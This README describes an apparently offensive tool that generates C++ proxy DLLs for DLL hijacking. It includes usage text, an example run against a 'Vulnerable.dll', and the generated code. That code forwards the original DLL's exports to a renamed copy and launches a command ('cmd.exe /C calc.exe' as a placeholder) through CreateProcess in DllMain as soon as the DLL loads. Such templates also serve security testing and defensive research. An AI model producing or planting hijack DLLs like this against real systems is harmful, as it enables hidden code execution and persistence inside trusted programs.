# DLL Proxy Generator

Given a target DLL, this script will output the skeleton of a new DLL that will proxy requests to the target DLL.


## Usage

```
usage: main.py [-h] [--exports-only] [-t TARGET] [-o OUTPUT] [-w] [--debug]
               dll

Generates C++ code that can act as a proxy for a DLL target file..

positional arguments:
  dll                   DLL to pull exports from.

optional arguments:
  -h, --help            show this help message and exit
  --exports-only        Only generate C++ exports using the target DLL file.
  -t TARGET, --target TARGET
                        Override the DLL filepath that the proxy should
                        target.
  -o OUTPUT, --output OUTPUT
                        Output C++ to file.
  -w, --overwrite       Automatically overwrite --output.
  --debug               Print debug information.

```

## Example
### Usage
```commandline
python.exe main.py -w --target "Z:\Renamed Vulnerable.dll" -o vulnerable.cpp "Z:\Vulnerable.dll"

2022-02-01 15:21:46,659 - DLLProxyGenerator - INFO: Replacing initial proxy target of "Vulnerable.dll" with "Z:\Renamed Vulnerable.dll".
2022-02-01 15:21:46,778 - DLLProxyGenerator - INFO: Wrote generated code to "Z:\vulnerable.cpp".
```

### Output
```C++
#pragma once
#pragma comment(linker,"/export:print_and_return_given_string=\"Z:\\Renamed Vulnerable.dll\".print_and_return_given_string,@1")
#pragma comment(linker,"/export:print_given_string=\"Z:\\Renamed Vulnerable.dll\".print_given_string,@2")
#pragma comment(linker,"/export:print_goodbye_world=\"Z:\\Renamed Vulnerable.dll\".print_goodbye_world,@3")
#pragma comment(linker,"/export:print_hello_world=\"Z:\\Renamed Vulnerable.dll\".print_hello_world,@4")

#include <windows.h>
#include <string>

int run()
{
    std::wstring payload(TEXT("cmd.exe /C calc.exe"));

    STARTUPINFO info = { sizeof(info) };
    PROCESS_INFORMATION procInfo;
    CreateProcess(NULL, (wchar_t*)payload.c_str(), NULL, NULL, TRUE, CREATE_DEFAULT_ERROR_MODE, NULL, NULL, &info, &procInfo);

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        run();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
    
```